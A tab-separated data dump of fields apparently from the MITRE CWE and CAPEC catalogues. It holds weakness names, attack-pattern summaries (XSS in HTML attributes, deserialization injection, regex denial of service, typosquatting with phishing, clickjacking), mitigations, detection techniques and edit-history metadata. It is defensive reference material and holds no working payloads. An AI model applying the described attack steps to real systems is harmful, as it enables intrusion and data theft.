13504	100	The MITRE Corporation
5675	39	2011-06-01
17159	88	Incomplete I/O Documentation
15744	103	Primary
12624	62	updated Common_Consequences
6349	43	Simple
22445	91	Architecture and Design
19292	35	MITRE
16081	62	updated Time_of_Introduction
8191	39	2010-04-05
6650	39	2011-06-27
18791	28	CWE Content Team
11437	28	CWE Content Team
16460	100	The MITRE Corporation
6495	55	CAPEC Content Team
19621	45	Base
18881	33	Ivan Ristic
11227	79	Availability
13189	35	MITRE
7542	85	539
10790	28	CWE Content Team
6730	62	updated Relationships, Taxonomy_Mappings
10193	23	An adversary inserts commands to perform cross-site scripting (XSS) actions in HTML attributes. Many filters do not adequately sanitize attributes against the presence of potentially dangerous commands even if they adequately sanitize tags. For example, dangerous expressions could be inserted into a style attribute in an anchor tag, resulting in the execution of malicious code when the resulting page is rendered. If a victim is tricked into viewing the rendered page the attack proceeds like a normal XSS attack, possibly resulting in the loss of sensitive cookies or other malicious activities.
6714	62	updated Relationships
20438	28	CWE Content Team
20718	55	CAPEC Content Team
19768	39	2011-03-29
15958	88	Information Exposure Through Persistent Cookies
17439	39	2017-11-08
16808	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Host Application Interface Scanner                            Fuzz Tester                            Framework-based Fuzzer                            Forced Path Execution                            Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious
17713	49	2010
6694	81	Other
19099	28	CWE Content Team
11949	39	2017-11-08
13606	56	CanPrecede
14214	50	Perform validation on canonical data.
19936	39	2018-03-27
21315	39	2008-09-08
25170	88	Incorrect Behavior Order: Early Amplification
9654	50	Implementation: Ensure that HTTP Get methods only retrieve state and do not alter state on the server side
7339	33	Michael Howard
23630	89	Standard
7542	40	The attacker must have working knowledge of some if not all of the components involved in the target system as well as the infrastructure and development environment of the manufacturer.
7118	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
23285	62	updated Relationships
10012	23	The developer builds a security-critical protection mechanism into the software, but the compiler optimizes the program such that the mechanism is removed or modified.
7555	62	updated Potential_Mitigations
17175	77	White Box
19650	104	49
16902	62	updated Common_Consequences, Demonstrative_Examples, Detection_Factors, Maintenance_Notes, Potential_Mitigations, Related_Attack_Patterns, Relationships
12409	27	Scanners or utilities that provide the ability to send custom ICMP queries.
6078	42	When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.
23746	46	If the program modifies the SSL_CTX object after creating SSL objects from it, there is the possibility that older SSL objects created from the original context could all be affected by that change.
20545	59	Updated Attack_Phases
18336	101	CAPEC Content Team
24995	35	MITRE
19321	96	2018-07-02
7429	28	CWE Content Team
20514	55	CAPEC Content Team
10240	53	The MITRE Corporation
5658	35	MITRE
5838	45	Variant
8647	76	2017-05-01
24608	51	2014-06-23
23179	39	2011-06-01
6750	28	CWE Content Team
17100	78	Very High
24911	23	The software generates an error message that includes sensitive information about its environment, users, or associated data.
9574	104	262
14060	62	updated Relationships
15777	103	Primary
10569	28	CWE Content Team
15298	61	Draft
23100	35	MITRE
11757	62	updated Relationships, Taxonomy_Mappings
12489	21	CWE Content Team
7903	39	2009-07-27
11958	35	MITRE
13252	35	MITRE
20132	24	Silicon Valley Bank
9457	61	Draft
18448	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
6799	62	updated Related_Attack_Patterns
17382	39	2008-08-15
5807	89	Detailed
13176	35	MITRE
18081	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.                   Developers sometimes omit certain "expensive" (resource-intensive) steps in order to improve performance, especially in devices with limited memory or CPU cycles. This could be done under a mistaken impression that the step is unnecessary for preserving security. Alternately, the developer might adopt a threat model that is inconsistent with that of its consumers by accepting a risk for which the remaining protection seems "good enough."
16663	35	MITRE
21123	95	[Request fingerprinting] Use automated tools or send web server specific commands to web server and wait for server's response.
17816	28	CWE Content Team
7501	33	Ben Halpern
9325	100	The MITRE Corporation
21660	28	CWE Content Team
19967	62	updated Alternate_Terms, Common_Consequences, Relationships, Relationship_Notes, Taxonomy_Mappings
19795	72	If the uninitialized pointer references a memory location that is not accessible to the program, or points to a location that is "malformed" (such as NULL) or larger than expected by a read or write operation, then a crash may occur.
18563	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
9547	81	Non-Repudiation
13618	28	CWE Content Team
21851	31	699
10690	88	J2EE Misconfiguration: Plaintext Password in Configuration File
22150	23	An adversary gathers sensitive information by exploiting the system's screen capture functionality. Through screenshots, the adversary aims to see what happens on the screen over the course of an operation. The adversary can leverage information gathered in order to carry out further attacks.
14539	39	2009-01-12
23249	90	Language-Independent
11757	39	2008-11-24
6366	28	CWE Content Team
12911	31	1000
5915	69	Incomplete
18036	56	ChildOf
14270	45	Variant
21812	23	The Web services architecture may require exposing a Web Service Definition Language (WSDL) file that contains information on the publicly accessible services and how callers of these services should interact with them (e.g. what parameters they expect and what types they return).
20825	28	CWE Content Team
19360	39	2019-06-20
21249	39	2010-02-16
12413	79	Authorization
9602	56	CanPrecede
7020	81	Integrity
17954	63	Modify Memory
11671	55	CAPEC Content Team
21375	39	2011-06-01
8929	39	2008-09-08
19714	28	CWE Content Team
18021	35	KDM Analytics
14557	89	Detailed
19150	23	An adversary attempts to exploit an application by injecting additional, malicious content during its processing of serialized objects. Developers leverage serialization in order to convert data or state into a static, binary format for saving to disk or transferring over a network. These objects are then deserialized when needed to recover the data/state. By injecting a malformed object into a vulnerable application, an adversary can potentially compromise the application by manipulating the deserialization process. This can result in a number of unwanted outcomes, including remote code execution.
17280	62	updated Observed_Examples
16474	35	MITRE
15827	45	Base
17618	76	2017-01-09
13219	25	Low
7230	59	Updated Related_Attack_Patterns
12068	31	1000
14915	103	Primary
25418	62	updated Alternate_Terms, Background_Details, Description, Maintenance_Notes, Name, Relationships
10304	39	2012-10-30
9084	62	updated Common_Consequences, Relationships, Observed_Example
13281	88	Insecure Default Variable Initialization
20999	91	Implementation
19174	103	Primary
14215	28	CWE Content Team
9282	32	Security Focus
23286	42	Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.                   OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.                   This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.                   Be careful to avoid CWE-243 and other weaknesses related to jails.
7903	62	updated Relationships
20563	62	updated Applicable_Platforms, Potential_Mitigations, References, Time_of_Introduction
14017	35	MITRE
18372	103	Primary
11910	28	CWE Content Team
16037	43	Simple
17021	42	Use the volatile type modifier for critical variables to avoid unexpected compiler optimization or reordering. This does not necessarily solve the synchronization problem, but it can help.
18566	39	2018-03-27
13344	35	MITRE
22296	79	Accountability
24282	28	CWE Content Team
20376	56	PeerOf
19283	56	ChildOf
7053	43	Simple
10378	78	Medium
10058	35	MITRE
8942	85	53
21371	28	CWE Content Team
22525	62	updated Demonstrative_Examples
12481	35	MITRE
18461	74	3
10892	35	MITRE
23393	50	Design: Utilize strict type, character, and encoding enforcement
22017	63	Bypass Protection Mechanism
24886	28	CWE Content Team
6215	35	Veracode
15928	72	Out of bounds memory access will very likely result in the corruption of relevant memory, and perhaps instructions, possibly leading to a crash. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop.
13526	62	updated Description, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings
25029	28	CWE Content Team
14190	66	XSS (Cross Site Scripting) Prevention Cheat Sheet
21279	102	ChildOf
9686	88	Return Inside Finally Block
24582	74	2
18063	35	MITRE
8318	91	Implementation
11942	69	Draft
7909	32	USENIX
20579	59	Updated Description Summary
20000	28	CWE Content Team
17639	88	Missing Password Field Masking
14165	39	2010-06-21
13174	42	Ensure that proper authentication is included in the system design.
17644	53	The MITRE Corporation
11340	35	Cigital
6695	39	2010-06-21
20271	39	2014-07-30
16022	62	updated Relationships
7846	97	Analysis of Packet Timing and Sizes
24650	28	CWE Content Team
16686	79	Confidentiality
22103	97	Fuzzing
21715	21	CLASP
19235	31	1000
8232	39	2009-01-12
18429	43	Simple
10711	62	updated Relationships, Taxonomy_Mappings
6090	67	High
11594	40	The padding oracle remains available for enough time / for as many requests as needed for the adversary to decrypt the ciphertext.
24011	91	Implementation
7065	35	MITRE
23987	35	MITRE
6573	91	Implementation
10178	31	1000
14485	51	2018-05-31
9546	21	CWE Content Team
12089	62	updated Relationships
10273	23	An attacker forces the target into a previous state in order to leverage potential weaknesses in the target dependent upon a prior configuration or state-dependent factors. Even in cases where an attacker may not be able to directly control the configuration of the targeted application, they may be able to reset the configuration to a prior state since many applications implement reset functions. Since these functions are usually intended as emergency features to return an application to a stable configuration if the current configuration degrades functionality, they may not be as strongly secured as other configuration options. The resetting of values is dangerous as it may enable undesired functionality, disable services, or modify access controls. At the very least this is a nuisance attack since the administrator will need to re-apply their configuration. At worst, this attack can open avenues for powerful attacks against the application, and, if it isn't obvious that the configuration has been reset, these vulnerabilities may be present a long time before they are notices.
19293	51	2014-06-23
23763	39	2014-07-30
11626	26	Architecture and Design
13683	79	Confidentiality
14536	56	ChildOf
8988	56	CanPrecede
7911	101	CAPEC Content Team
7411	47	Read Data
7901	23	An attacker discovers the structure, function, and composition of a type of computer software through white box analysis techniques. White box techniques involve methods which can be applied to a piece of software when an executable or some other compiled object can be directly subjected to analysis, revealing at least a portion of its machine instructions that can be observed upon execution.
16444	39	2010-06-21
7987	91	Build and Compilation
12636	78	Low
7655	31	1000
24167	28	CWE Content Team
8239	81	Other
6007	89	Standard
23220	97	Weakening of Cellular Encryption
20254	36	http://www.owasp.org/index.php/Testing_for_Session_Management
12168	35	MITRE
12205	62	updated Common_Consequences
8519	100	The MITRE Corporation
20663	35	MITRE
16926	92	Explore
24096	62	updated Relationships, Taxonomy_Mappings
18608	56	ChildOf
16203	35	MITRE
8051	78	High
18537	39	2008-10-14
7417	35	MITRE
22485	39	2009-03-10
9182	89	Detailed
11820	28	CWE Content Team
19013	59	Updated Attack_Prerequisites, Description Summary, Resources_Required
8573	103	Primary
19865	35	MITRE
20882	104	566
11594	61	Draft
25428	62	updated References, Demonstrative_Example, Potential_Mitigations, Time_of_Introduction
12187	61	Stable
21631	28	CWE Content Team
6222	56	ChildOf
22009	88	Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')
14617	35	MITRE
8303	45	Class
20439	35	MITRE
8084	35	Cigital
14248	100	The MITRE Corporation
23566	62	updated Relationships
23172	26	Operation
14101	46	This issue can make the software perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.    While the interpretation of "excessively large" may vary for each product or developer, CISQ recommends a default of 5 sub-elements.
24044	66	Output Sanitization
12884	77	Manual Analysis
16934	86	https://en.wikipedia.org/wiki/Null_pointer#Null_dereferencing
13193	90	C#
21021	39	2012-05-11
21408	28	CWE Content Team
19729	33	Grant Murphy
6688	51	2014-06-23
15455	62	updated Relationships, Weakness_Ordinalities
18116	76	2015-11-09
10620	31	1000
13138	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Context-configured Source Code Weakness Analyzer
8310	72	The application can operate on unexpected files. This may violate integrity if the filename is written to, or if the filename is for a program or other form of executable code.
8829	103	Primary
13846	44	High
15222	35	MITRE
12858	28	CWE Content Team
25375	91	System Configuration
25053	28	CWE Content Team
18138	28	CWE Content Team
13363	62	updated Potential_Mitigations
14273	75	Note that this technique is only useful for permissions issues related to system resources. It is not likely to detect application-level business rules that are related to permissions, such as if a user of a blog system marks a post as "private," but the blog system inadvertently marks it as "public."
10173	105	Mobile
6432	39	2011-06-01
21820	28	CWE Content Team
6242	62	updated Related_Attack_Patterns
17630	55	CAPEC Content Team
20726	72	It may be possible to execute arbitrary code through the use of a write-what-where condition.
11169	79	Access Control
23066	89	Meta
22463	35	MITRE
16486	39	2008-10-14
21365	39	2011-06-01
24784	76	2015-12-07
24122	45	Base
9925	79	Availability
16910	35	MITRE
18713	88	Storage of Sensitive Data in a Mechanism without Access Control
6529	26	Architecture and Design
5798	35	MITRE
24484	28	CWE Content Team
15600	95	Upon successful hijacking, the adversary enjoys elevated privileges, and can possibly have the hijacked thread do his bidding
9342	91	Implementation
7184	28	CWE Content Team
16707	39	2010-02-16
22620	95	An adversary determines the input data stream that is being processed by an XML parser on the victim's side.
13793	49	2005
16166	21	PLOVER
20661	95	[Impersonate trusted domain] In order to impersonate the trusted domain, the adversary needs to register the TypoSquatted URL.
14984	35	MITRE
10036	69	Draft
24548	39	2011-06-01
7911	100	The MITRE Corporation
17309	28	CWE Content Team
12296	85	469
9400	45	Variant
12887	56	ChildOf
7610	62	updated Description
25173	39	2008-07-01
6478	33	Heiko Webers
20298	78	Medium
23281	39	2011-09-13
24509	39	2019-06-20
20653	101	CAPEC Content Team
15837	103	Primary
12628	104	710
18557	28	CWE Content Team
17573	79	Availability
23623	35	MITRE
7472	23	The application does not properly handle when a leading character or sequence ("leader") is missing or malformed, or if multiple leaders are used when only one should be allowed.
22151	58	Windows provides a large number of utility functions that manipulate buffers containing filenames. In most cases, the result is returned in a buffer that is passed in as input. (Usually the filename is modified in place.) Most functions require the buffer to be at least MAX_PATH bytes in length, but you should check the documentation for each function individually. If the buffer is not large enough to store the result of the manipulation, a buffer overflow can occur.
5581	62	updated Time_of_Introduction
23573	56	ChildOf
13624	88	Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')
21973	28	CWE Content Team
19245	73	Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.
8107	26	Implementation
22715	39	2013-02-21
16948	35	Cigital
6972	35	MITRE
13414	26	Implementation
21633	62	updated Relationships, Other_Notes, Taxonomy_Mappings
8517	79	Access Control
9873	104	615
14762	62	updated Potential_Mitigations
6013	28	CWE Content Team
23825	35	MITRE
23399	56	ChildOf
7811	85	247
24120	28	CWE Content Team
9356	101	CAPEC Content Team
17982	28	CWE Content Team
16012	28	CWE Content Team
16474	62	updated Modes_of_Introduction, References, Relationships
10225	92	Explore
19789	33	Frank Kim
16682	63	Execute Unauthorized Code or Commands
20671	28	CWE Content Team
5627	60	08
23710	39	2009-03-10
17117	50	This attack may be mitigated by changing default cache sizes to be larger at the OS level. Additionally rules can be enforced to prune the cache with shorter timeouts for packet reassembly as the cache nears capacity.
5921	63	Unexpected State
22912	35	MITRE
5983	35	Cigital
12567	85	275
21450	28	CWE Content Team
13591	56	ChildOf
14755	81	Other
14286	100	The MITRE Corporation
20695	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit
8875	39	2011-03-29
6681	62	updated Relationships
13436	35	MITRE
24079	40	The adversary has the capability to interact with the application directly.The target system does not adequately implement safeguards to prevent misuse of authorized actions/processes.
9848	100	The MITRE Corporation
5955	44	High
22825	39	2017-11-08
17292	104	368
5584	79	Confidentiality
20953	80	The adversary requires strong inter-personal and communication skills.
24964	28	CWE Content Team
19648	28	Eric Dalci
11345	56	PeerOf
14292	100	The MITRE Corporation
23168	90	Language-Independent
9771	53	The MITRE Corporation
16684	74	2
15875	89	Meta
22479	39	2011-06-01
7877	39	2011-06-01
9145	62	added/updated demonstrative examples
12575	39	2008-09-08
20417	92	Experiment
19029	39	2009-03-10
23255	49	2008
21101	56	ChildOf
17687	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
12304	74	1
21536	77	Automated Static Analysis
24680	35	MITRE
10268	39	2011-06-27
13145	47	Execute Unauthorized Commands
9931	51	2014-06-23
9459	92	Experiment
15715	33	Alec Muffet
8396	39	2009-03-10
12612	89	Detailed
17777	28	CWE Content Team
22525	28	CWE Content Team
13519	23	An adversary may execute an attack on a program that uses a poor Regular Expression(Regex) implementation by choosing input that results in an extreme situation for the Regex. A typical extreme situation operates at exponential time compared to the input size. This is due to most implementations using a Nondeterministic Finite Automaton(NFA) state machine to be built by the Regex algorithm since NFA allows backtracking and thus more complex regular expressions. The algorithm builds a finite state machine and based on the input transitions through all the states until the end of the input is reached. NFA engines may evaluate each character in the input string multiple times during the backtracking. The algorithm tries each path through the NFA one by one until a match is found; the malicious input is crafted so every path is tried which results in a failure. Exploitation of the Regex results in programs hanging or taking a very long time to complete. These attacks may target various layers of the Internet due to regular expressions being used in validation.
23515	79	Authorization
7055	72	If a program relies solely on the name of an object to determine identity, it may execute the incorrect or unintended code.
14659	103	Primary
19141	35	MITRE
19047	46	On later Windows operating systems, a file can have a "long name" and a short name that is compatible with older Windows file systems, with up to 8 characters in the filename and 3 characters for the extension. These "8.3" filenames, therefore, act as an alternate name for files with long names, so they are useful pathname equivalence manipulations.
24588	104	9
19552	103	Primary
11569	102	ChildOf
6211	56	ChildOf
13850	48	09
12358	39	2015-12-07
22977	103	Primary
18885	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.                   Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.
14767	39	2009-10-29
16364	35	MITRE
23075	31	1000
15224	90	Language-Independent
17082	35	MITRE
22587	36	http://ha.ckers.org/blog/20090617/slowloris-http-dos/
18568	28	CWE Content Team
22785	35	MITRE
19819	35	MITRE
13701	69	Incomplete
12434	104	84
7991	23	An adversary injects traffic into the target's network connection. The adversary is therefore able to degrade or disrupt the connection, and potentially modify the content. This is not a flooding attack, as the adversary is not focusing on exhausting resources. Instead, the adversary is crafting a specific input to affect the system in a particular way.
18100	62	updated Description, Name, Potential_Mitigations
11359	35	MITRE
12137	81	Integrity
23328	39	2019-01-03
9748	39	2014-07-30
13541	76	2019-04-04
21260	62	updated Applicable_Platforms, Causal_Nature
18238	62	updated Common_Consequences
7484	81	Confidentiality
12598	50	Ensure the application is using parsing and data display techniques that will accurately display control characters, international symbols and markings, and ultimately recognize potential homograph attacks.
15579	35	Cigital
11648	88	Improper Neutralization of Variable Name Delimiters
22191	72	The object could potentially be tampered with.
18547	63	Read Application Data
16075	45	Base
8394	28	CWE Content Team
13962	60	24
18926	79	Confidentiality
9785	27	Ability to include malicious script in document, e.g. HTML file, or XML document. Ability to deploy a custom hostile service for access by targeted clients. Ability to communicate synchronously or asynchronously with client machine
14650	39	2008-07-01
18311	62	updated Related_Attack_Patterns
19606	39	2008-11-24
10916	35	MITRE
7389	59	Updated Example_Instances, Related_Attack_Patterns, Taxonomy_Mappings
18976	97	Sniffing Network Traffic
18213	39	2013-02-21
21044	63	DoS: Instability
14575	56	ChildOf
9914	39	2009-05-27
15431	63	DoS: Resource Consumption (Other)
17265	35	MITRE
19538	90	C
11764	28	CWE Content Team
19596	35	MITRE
9954	35	MITRE
20822	47	Bypass Protection Mechanism
16779	39	2008-10-14
13032	75	These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.
24616	35	MITRE
7010	28	CWE Content Team
6030	46	This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.             The '...' manipulation is useful for bypassing some path traversal protection schemes. On some Windows systems, it is equivalent to "..\.." and might bypass checks that assume only two dots are valid. Incomplete filtering, such as removal of "./" sequences, can ultimately produce valid ".." sequences due to a collapse into unsafe value (CWE-182).
16563	92	Explore
7013	91	Testing
7687	39	2019-09-23
13084	35	MITRE
24313	35	MITRE
7151	91	Operation
21577	39	2010-09-09
8123	40	The web server is susceptible to one of the various web application exploits that allows for uploading a shell file.
16356	56	ChildOf
24887	35	MITRE
15919	62	updated Applicable_Platforms, Description, Other_Notes
20458	59	Updated Related_Attack_Patterns
22696	91	Requirements
10508	69	Draft
10749	63	Alter Execution Logic
19764	60	04
8649	73	Use XML reserved characters or words, possibly with other input data to attempt to cause unexpected results
16628	39	2012-05-11
7793	39	2019-06-20
20066	78	Medium
6387	28	CWE Content Team
13813	104	687
9034	62	updated Applicable_Platforms
21743	62	updated References, Related_Attack_Patterns, Relationships
23042	50	Design: Use a secure message authentication code (MAC) function such as an HMAC-SHA1
9420	51	2014-06-23
13686	62	added/updated demonstrative examples
22539	42	Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.                   Many open redirect problems occur because the programmer assumed that certain inputs could not be modified, such as cookies and hidden form fields.
16760	42	For function names, ensure that you are only calling functions that accept the proper number of arguments, to avoid unexpected null arguments.
23239	61	Stable
6547	53	The MITRE Corporation
6613	91	Implementation
15514	35	MITRE
24929	36	http://www.owasp.org/index.php/Category:Encoding
22703	35	MITRE
22345	26	Architecture and Design
9816	62	updated Relationships
15010	28	CWE Content Team
8114	28	CWE Content Team
19891	46	This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
19884	72	The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.
18530	42	In languages that support it, use synchronization primitives. Only wrap these around critical code to minimize the impact on performance.
15714	62	updated Description, Name, Relationships
23428	39	2011-06-01
16825	21	7 Pernicious Kingdoms
15906	28	CWE Content Team
24403	79	Access Control
20198	62	updated Potential_Mitigations
10555	53	The MITRE Corporation
7434	35	MITRE
18954	73	When the JavaScript 'document.location' variable is used as part of the parameter, inject '#' and the payload into the parameter in the URL.
9960	42	Do not rely exclusively on blacklist validation to detect malicious input or to encode output. There are too many variants to encode a character; you're likely to miss some variants.
23401	39	2017-11-08
14267	28	KDM Analytics
16061	52	Automated static analysis may be useful for detecting unusual conditions involving system resources or common programming idioms, but not for violations of business rules.
10599	56	ChildOf
17305	35	MITRE
11404	35	MITRE
25093	100	The MITRE Corporation
15701	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
16312	51	2014-06-23
8773	39	2019-01-03
13711	42	Refactor the code so that internal program variables do not need to be dynamically identified.
7031	66	A Study in Scarlet
14588	56	ChildOf
7882	62	updated Relationships, Relationship_Notes, Research_Gaps, Taxonomy_Mappings
18745	39	2009-07-27
18276	39	2014-07-30
15852	35	Cigital
11601	59	Updated Attacker_Skills_or_Knowledge_Required
24205	62	updated Relationships
10911	62	added/updated white box definitions
17650	28	CWE Content Team
21673	102	ChildOf
9830	88	Unsigned to Signed Conversion Error
12459	103	Primary
16207	62	updated Relationships, Taxonomy_Mappings
13159	97	Documentation Alteration to Produce Under-performing Systems
9607	28	CWE Content Team
21118	39	2011-06-01
9306	39	2008-11-24
10200	62	updated Relationships
11603	61	Stable
11043	35	MITRE
20151	35	Cigital
15635	45	Variant
6514	35	MITRE
12578	35	MITRE
21012	46	This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
11292	76	2017-01-09
7728	21	CLASP
13172	28	CWE Content Team
8532	28	Eric Dalci
20599	78	Medium
20983	23	An adversary exploits a weakness in authentication to create an access token (or equivalent) that impersonates a different entity, and then associates a process/thread to that that impersonated token. This action causes a downstream user to make a decision or take action that is based on the assumed identity, and not the response that blocks the adversary.
17371	39	2008-09-08
20215	28	CWE Content Team
25030	95	If the target program has a deadlock condition, the program waits indefinitely resulting in a denial of service.
21883	21	CWE Content Team
21812	88	Information Exposure Through WSDL File
13093	31	1000
10029	35	Cigital
6938	47	Execute Unauthorized Commands
17545	101	CAPEC Content Team
15422	62	updated Time_of_Introduction
14635	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
10201	88	Exposed IOCTL with Insufficient Access Control
13477	62	updated Relationships, Taxonomy_Mappings
8581	56	ChildOf
11844	80	Solid understanding of the HTTP protocol
13007	21	CLASP
9354	91	Architecture and Design
14735	28	CWE Content Team
8950	21	PLOVER
22216	35	MITRE
7034	104	267
6091	86	http://manicode.blogspot.com/2008/08/input-validation-with-esapi.html
15559	73	Execute a phishing attack and send a user an e-mail convincing the user to click on a link leading the user to the SoundSquatted domain.
6964	102	ChildOf
12534	25	High
20530	28	CWE Content Team
12281	96	2010-09-22
8513	63	Reduce Maintainability
13165	62	updated Relationships
9220	62	updated Potential_Mitigations
7664	61	Draft
15761	47	Gain Privileges
7267	39	2011-09-13
11422	62	updated Description, Other_Notes, Potential_Mitigations
20770	35	MITRE
6532	79	Confidentiality
9416	91	Testing
5784	40	Access to the software currently deployed at a victim location. This access is often obtained by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have.
21543	62	updated Potential_Mitigations
11747	35	MITRE
14365	78	Medium
10873	77	Dynamic Analysis with Automated Results Interpretation
14392	25	Low
9198	39	2014-07-30
16827	95	[Trick victim into interacting with the clickjacking page in the desired manner] The adversary tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim's level of privilege.
14157	35	MITRE
18392	28	CWE Content Team
16669	63	Read Application Data
21287	35	MITRE
24970	36	http://blog.watchfire.com/wfblog/2009/02/active-man-in-the-middle-attacks.html
18174	28	CWE Content Team
15100	35	MITRE
5963	39	2011-09-13
7183	62	updated Applicable_Platforms, Demonstrative_Examples
23793	69	Incomplete
18382	100	The MITRE Corporation
8912	35	MITRE
17378	89	Standard
14753	62	updated Demonstrative_Examples
25408	39	2017-11-08
9673	31	1000
15955	96	2018-07-02
6258	73	The attacker injects context-appropriate malicious file system control syntax in order to manipulate the meta-data of the targeted file.
6175	28	CWE Content Team
18722	90	XML
16397	39	2014-07-30
10870	62	updated Relationships
6748	39	2018-03-27
6888	28	CWE Content Team
17106	62	updated Potential_Mitigations, Time_of_Introduction
7060	51	2014-06-23
10079	56	ChildOf
20357	62	updated Description, Name, Observed_Examples, Relationships
25024	103	Primary
18796	47	Read Data
24810	31	699
25387	50	Design: Utilize strict type, character, and encoding enforcement
10305	59	Updated Attacker_Skills_or_Knowledge_Required
5646	31	1000
25277	76	2018-07-31
13769	42	Developers should anticipate that internal special elements will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
21110	35	MITRE
13868	39	2012-10-30
13796	25	High
20907	43	Simple
5664	28	CWE Content Team
17697	43	Simple
12473	28	CWE Content Team
6124	28	CWE Content Team
18713	90	Language-Independent
13426	90	Java
25005	45	Variant
7554	28	CWE Content Team
17984	33	Gregory Steuck
24341	35	MITRE
9503	92	Explore
14363	39	2011-06-01
8398	101	CAPEC Content Team
16651	50	Implementation: Run xml parsing and query infrastructure with minimal privileges so that an attacker is limited in their ability to probe other system resources from XQL.
15616	91	Implementation
12458	35	MITRE
20891	69	Draft
12109	39	2014-07-30
12379	44	High
10872	28	CWE Content Team
11172	50	Implementation: Perform output validation for all remote content.
6472	45	Variant
5845	35	MITRE
14687	56	ChildOf
20285	56	ChildOf
5814	88	Missing Report of Error Condition
19165	101	CAPEC Content Team
10725	56	ChildOf
17948	103	Primary
10094	63	Reduce Maintainability
18379	103	Primary
14201	59	Updated Resources_Required
7440	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)                            Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Attack Modeling
